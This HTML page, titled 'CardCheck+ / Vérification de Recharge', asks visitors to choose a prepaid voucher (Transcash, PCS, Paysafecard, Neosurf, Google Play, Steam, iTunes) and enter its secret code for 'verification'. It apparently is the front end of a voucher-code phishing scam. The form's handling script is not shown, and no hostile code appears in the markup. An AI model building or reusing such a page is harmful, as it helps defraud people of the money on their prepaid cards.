<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vérification de carte</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>
<body>
  <div class="animated-bg">
    <canvas id="bg-canvas"></canvas>
  </div>
  <div class="container">
    <header>
      <div class="logo">
        <!-- Logo SVG personnalisé -->
        <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="22" cy="22" r="22" fill="#6366f1"/>
          <path d="M13 22C13 17.0294 17.0294 13 22 13C26.9706 13 31 17.0294 31 22C31 26.9706 26.9706 31 22 31C17.0294 31 13 26.9706 13 22Z" fill="#fff"/>
          <path d="M22 18V26" stroke="#6366f1" stroke-width="2.5" stroke-linecap="round"/>
          <circle cx="22" cy="28" r="1.5" fill="#6366f1"/>
        </svg>
        <span class="logo-text">CardCheck+</span>
      </div>
      <button id="darkModeToggle" title="Activer/désactiver le mode sombre"><i class="fa-solid fa-moon"></i></button>
      <h1>Vérification de Recharge</h1>
      <p class="subtitle">Sélectionnez votre carte et vérifiez votre code en toute sécurité</p>
    </header>
    <img src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=600&q=80" alt="Illustration carte" class="main-illustration">
    <form id="verifyForm" autocomplete="off">
      <div class="input-group">
        <label for="cardType"><i class="fa-solid fa-layer-group"></i> Type de carte</label>
        <select id="cardType">
          <option value="Transcash">Transcash</option>
          <option value="Google Play">Google Play</option>
          <option value="SteamCard">SteamCard</option>
          <option value="Paysafe card">Paysafe card</option>
          <option value="PCS">PCS</option>
          <option value="ITunes">ITunes</option>
          <option value="Néosurf">Néosurf</option>
        </select>
      </div>
      <div class="input-group hide-code">
        <label><i class="fa-solid fa-eye-slash"></i> Cacher le code ?</label>
        <input type="radio" name="hideCode" value="yes" checked> Oui
        <input type="radio" name="hideCode" value="no"> Non
      </div>
      <div class="input-group">
        <label for="codeInput"><i class="fa-solid fa-key"></i> Code</label>
        <input type="password" id="codeInput" placeholder="Entrez le code" maxlength="20">
      </div>
      <button id="verifyBtn" type="submit"><i class="fa-solid fa-magnifying-glass"></i> Vérifier</button>
    </form>
    <div id="result" class="result-badge"></div>
  </div>
  <script src="js/script.js"></script>
  <script src="js/bg-anim.js"></script>
</body>
</html>
